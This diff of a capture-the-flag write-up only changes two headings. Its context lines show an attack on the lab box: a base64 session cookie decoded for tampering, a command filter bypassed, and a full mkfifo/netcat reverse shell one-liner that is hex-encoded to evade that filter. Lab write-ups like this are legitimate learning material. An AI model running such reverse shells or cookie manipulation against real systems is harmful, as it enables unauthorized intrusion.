@@ -34,7 +34,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Just ssh and a web server ports are open so lets check out the page.
 
-#Web Server Port 80
+# Web Server Port 80
 A gold buying website for mmo's. We start by looking at the source code and pages before we try enumerating directories and subdomains with gobuster. We find a couple interesting things. Firstly a admin page that is grayed out from being selected but a link to is viewable in the source code at /admin. Going to it seems to simply put us on the home page, but maybe we have a session cookie we can manipulate to change this. We find a session cookie with the following value.
 ```
 echo 'Z3Vlc3Q=' | base64 -d
@@ -103,7 +103,7 @@ There has been an error when trying to view uid=1000(jed) gid=1000(jed) groups=1
 
 Awesome, we have bypassed the filter and got the id command to execute so let's just take a normal reverse shell such as rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f, and then hex-encoded it with /x delimiters and try and replace the 'id' command with it. Sure enough we get a hit on our listener and we have a foothold
 
-#Initial Foothold/Privilege Escalation
+# Initial Foothold/Privilege Escalation
 We get a shell as the jed user in their home directory and can find the user.txt flag here. Next we find the following,
 ```
 jed@keldagrim:~$ sudo -l
